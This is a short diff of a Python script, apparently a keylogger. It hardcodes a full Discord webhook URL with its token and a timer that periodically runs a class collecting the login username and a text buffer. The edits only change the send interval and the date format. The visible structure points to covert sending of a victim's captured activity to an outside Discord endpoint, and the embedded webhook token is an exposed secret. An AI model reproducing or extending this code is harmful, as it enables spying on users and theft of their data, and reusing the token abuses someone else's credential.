@@ -5,7 +5,7 @@ from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-INTERVAL = 5
+INTERVAL = 60
 WEBHOOK = "https://discord.com/api/webhooks/1252318266714619936/QOs16L3ro2s9rMbb27HKlAPlUqZg91g2uCMbkqpSDl9tW1_NLrtQegKXPjTIDq8AAOpY"
 
 class Klasa:
@@ -13,7 +13,7 @@ class Klasa:
         now = datetime.now()
         self.interval = interval
         self.script = ""
-        self.date = now.strftime('%d/%m/%Y')
+        self.date = now.strftime('%d-%m-%Y')
         self.time = now.strftime('%H:%M')
         self.username = os.getlogin()
         self.timer = Timer(interval=self.interval, function=self.run)
